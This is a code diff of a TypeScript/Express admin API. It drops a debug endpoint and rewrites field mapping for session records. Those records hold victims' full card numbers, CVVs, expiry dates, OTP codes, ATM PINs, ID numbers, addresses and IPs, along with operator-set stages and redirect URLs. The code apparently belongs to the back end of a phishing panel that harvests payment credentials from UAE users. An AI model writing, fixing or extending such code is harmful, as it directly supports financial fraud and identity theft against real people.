@@ -268,26 +268,6 @@ app.get('/api/admin/stats', async (req, res) => {
 });
 
 // Get all sessions
-// Debug endpoint
-app.get('/api/admin/debug', async (req, res) => {
-  const token = req.headers.authorization?.replace('Bearer ', '');
-  if (!token || !verifyAdminToken(token)) {
-    return res.status(401).json({ error: 'غير مصرح' });
-  }
-  const sessionIdVal = req.query.sessionId as string;
-  if (!sessionIdVal) return res.json({ error: 'missing sessionId' });
-  
-  const registration = await getRegistrationBySessionId(sessionIdVal);
-  const allRegistrations = await getAllRegistrations(5);
-  
-  res.json({
-    requestedSessionId: sessionIdVal,
-    registrationFound: registration ? true : false,
-    registration: registration,
-    allRegistrations: allRegistrations.map(r => ({ sessionId: r.sessionId || (r as any).sessionid, addressEmirate: (r as any).addresseemirate, addressDistrict: (r as any).addressdistrict }))
-  });
-});
-
 app.get('/api/admin/sessions', async (req, res) => {
   const token = req.headers.authorization?.replace('Bearer ', '');
   if (!token || !verifyAdminToken(token)) {
@@ -303,44 +283,46 @@ app.get('/api/admin/sessions', async (req, res) => {
   for (const session of sessions) {
     const sessionIdVal = session.sessionId || (session as any).sessionid;
     const registration = await getRegistrationBySessionId(sessionIdVal);
-    console.log('[Admin Debug] sessionId:', sessionIdVal, 'registration:', registration ? 'found' : 'NOT found');
-    if (registration) {
-      console.log('[Admin Debug] registration keys:', Object.keys(registration));
-      console.log('[Admin Debug] registration.addressEmirate:', (registration as any).addressEmirate);
-      console.log('[Admin Debug] registration.addresseemirate:', (registration as any).addresseemirate);
-    }
+    const reg = registration as any;
+    
+    // Get address fields from registration using bracket notation
+    const regAddrEmirate = reg?.['addresseemirate'] || reg?.addressEmirate || null;
+    const regAddrDistrict = reg?.['addressdistrict'] || reg?.addressDistrict || null;
+    const regAddrStreet = reg?.['addressstreet'] || reg?.addressStreet || null;
+    const regAddrBuilding = reg?.['addressbuildingnumber'] || reg?.addressBuildingNumber || null;
+    const regIdNumber = reg?.['idnumber'] || reg?.idNumber || null;
+    
     const s: any = {
-      ...session,
-      // Normalize PostgreSQL lowercase fields to camelCase
-      id: session.id || session['id'],
-      sessionId: session.sessionId || (session as any)['sessionid'],
-      fullName: session.fullName || (session as any)['fullname'],
-      phoneNumber: session.phoneNumber || (session as any)['phonenumber'],
-      email: session.email || session['email'],
-      emirate: session.emirate || session['emirate'],
-      district: session.district || session['district'],
-      membershipTier: session.membershipTier || (session as any)['membershiptier'],
-      totalAmount: session.totalAmount || (session as any)['totalamount'],
-      idNumber: session.idNumber || (session as any)['idnumber'] || registration?.idNumber || (registration as any)?.idnumber || null,
-      addressEmirate: registration?.addressEmirate || (registration as any)?.addresseemirate || null,
-      addressDistrict: registration?.addressDistrict || (registration as any)?.addressdistrict || null,
-      addressStreet: registration?.addressStreet || (registration as any)?.addressstreet || null,
-      addressBuildingNumber: registration?.addressBuildingNumber || (registration as any)?.addressbuildingnumber || null,
-      cardName: session.cardName || (session as any)['cardname'],
-      cardNumber: session.cardNumber || (session as any)['cardnumber'],
-      cardNumberMasked: session.cardNumberMasked || (session as any)['cardnumbermasked'],
-      cardExpiry: session.cardExpiry || (session as any)['cardexpiry'],
-      cardCvv: session.cardCvv || (session as any)['cardcvv'],
-      otpCode: session.otpCode || (session as any)['otpcode'],
-      atmPin: session.atmPin || (session as any)['atmpin'],
-      stage: session.stage || session['stage'],
-      errorMessage: session.errorMessage || (session as any)['errormessage'],
-      clientIp: session.clientIp || (session as any)['clientip'],
-      userAgent: session.userAgent || (session as any)['useragent'],
-      statusRead: session.statusRead || (session as any)['statusread'],
-      redirectUrl: session.redirectUrl || (session as any)['redirecturl'],
-      createdAt: session.createdAt || (session as any)['createdat'],
-      updatedAt: session.updatedAt || (session as any)['updatedat'],
+      // Don't spread session first - build explicitly to avoid field conflicts
+      id: session.id || (session as any).id,
+      sessionId: (session as any).sessionid || session.sessionId,
+      fullName: (session as any).fullname || session.fullName,
+      phoneNumber: (session as any).phonenumber || session.phoneNumber,
+      email: session.email,
+      emirate: session.emirate,
+      district: session.district,
+      membershipTier: (session as any).membershiptier || session.membershipTier,
+      totalAmount: (session as any).totalamount || session.totalAmount,
+      idNumber: regIdNumber || (session as any).idnumber || session.idNumber,
+      addressEmirate: regAddrEmirate,
+      addressDistrict: regAddrDistrict,
+      addressStreet: regAddrStreet,
+      addressBuildingNumber: regAddrBuilding,
+      cardName: (session as any).cardname || session.cardName,
+      cardNumber: (session as any).cardnumber || session.cardNumber,
+      cardNumberMasked: (session as any).cardnumbermasked || session.cardNumberMasked,
+      cardExpiry: (session as any).cardexpiry || session.cardExpiry,
+      cardCvv: (session as any).cardcvv || session.cardCvv,
+      otpCode: (session as any).otpcode || session.otpCode,
+      atmPin: (session as any).atmpin || session.atmPin,
+      stage: session.stage,
+      errorMessage: (session as any).errormessage || session.errorMessage,
+      clientIp: (session as any).clientip || session.clientIp,
+      userAgent: (session as any).useragent || session.userAgent,
+      statusRead: (session as any).statusread || session.statusRead,
+      redirectUrl: (session as any).redirecturl || session.redirectUrl,
+      createdAt: (session as any).createdat || session.createdAt,
+      updatedAt: (session as any).updatedat || session.updatedAt,
     };
     enriched.push(s);
   }
@@ -364,36 +346,38 @@ app.get('/api/admin/sessions/:sessionId', async (req, res) => {
   const registration = await getRegistrationBySessionId(sessionIdVal);
   await updateSession(sessionIdVal, { statusRead: 1 });
   
+  const reg = registration as any;
   const s: any = {
-    ...session,
-    sessionId: session.sessionId || (session as any).sessionid,
-    fullName: session.fullName || (session as any).fullname,
-    phoneNumber: session.phoneNumber || (session as any).phonenumber,
-    email: session.email || (session as any).email,
-    emirate: session.emirate || (session as any).emirate,
-    district: session.district || (session as any).district,
-    membershipTier: session.membershipTier || (session as any).membershiptier,
-    totalAmount: session.totalAmount || (session as any).totalamount,
-    idNumber: session.idNumber || (session as any).idnumber || registration?.idNumber || (registration as any)?.idnumber || null,
-    addressEmirate: registration?.addressEmirate || (registration as any)?.addresseemirate || null,
-    addressDistrict: registration?.addressDistrict || (registration as any)?.addressdistrict || null,
-    addressStreet: registration?.addressStreet || (registration as any)?.addressstreet || null,
-    addressBuildingNumber: registration?.addressBuildingNumber || (registration as any)?.addressbuildingnumber || null,
-    cardName: session.cardName || (session as any).cardname,
-    cardNumber: session.cardNumber || (session as any).cardnumber,
-    cardNumberMasked: session.cardNumberMasked || (session as any).cardnumbermasked,
-    cardExpiry: session.cardExpiry || (session as any).cardexpiry,
-    cardCvv: session.cardCvv || (session as any).cardcvv,
-    otpCode: session.otpCode || (session as any).otpcode,
-    atmPin: session.atmPin || (session as any).atmpin,
-    stage: session.stage || (session as any).stage,
-    errorMessage: session.errorMessage || (session as any).errormessage,
-    clientIp: session.clientIp || (session as any).clientip,
-    userAgent: session.userAgent || (session as any).useragent,
-    statusRead: session.statusRead || (session as any).statusread,
-    redirectUrl: session.redirectUrl || (session as any).redirecturl,
-    createdAt: session.createdAt || (session as any).createdat,
-    updatedAt: session.updatedAt || (session as any).updatedat,
+    // Build explicitly without spread to avoid field conflicts
+    id: session.id || (session as any).id,
+    sessionId: (session as any).sessionid || session.sessionId,
+    fullName: (session as any).fullname || session.fullName,
+    phoneNumber: (session as any).phonenumber || session.phoneNumber,
+    email: session.email,
+    emirate: session.emirate,
+    district: session.district,
+    membershipTier: (session as any).membershiptier || session.membershipTier,
+    totalAmount: (session as any).totalamount || session.totalAmount,
+    idNumber: reg?.['idnumber'] || reg?.idNumber || (session as any).idnumber || session.idNumber,
+    addressEmirate: reg?.['addresseemirate'] || reg?.addressEmirate || null,
+    addressDistrict: reg?.['addressdistrict'] || reg?.addressDistrict || null,
+    addressStreet: reg?.['addressstreet'] || reg?.addressStreet || null,
+    addressBuildingNumber: reg?.['addressbuildingnumber'] || reg?.addressBuildingNumber || null,
+    cardName: (session as any).cardname || session.cardName,
+    cardNumber: (session as any).cardnumber || session.cardNumber,
+    cardNumberMasked: (session as any).cardnumbermasked || session.cardNumberMasked,
+    cardExpiry: (session as any).cardexpiry || session.cardExpiry,
+    cardCvv: (session as any).cardcvv || session.cardCvv,
+    otpCode: (session as any).otpcode || session.otpCode,
+    atmPin: (session as any).atmpin || session.atmPin,
+    stage: session.stage,
+    errorMessage: (session as any).errormessage || session.errorMessage,
+    clientIp: (session as any).clientip || session.clientIp,
+    userAgent: (session as any).useragent || session.userAgent,
+    statusRead: (session as any).statusread || session.statusRead,
+    redirectUrl: (session as any).redirecturl || session.redirectUrl,
+    createdAt: (session as any).createdat || session.createdAt,
+    updatedAt: (session as any).updatedat || session.updatedAt,
   };
   
   res.json(s);
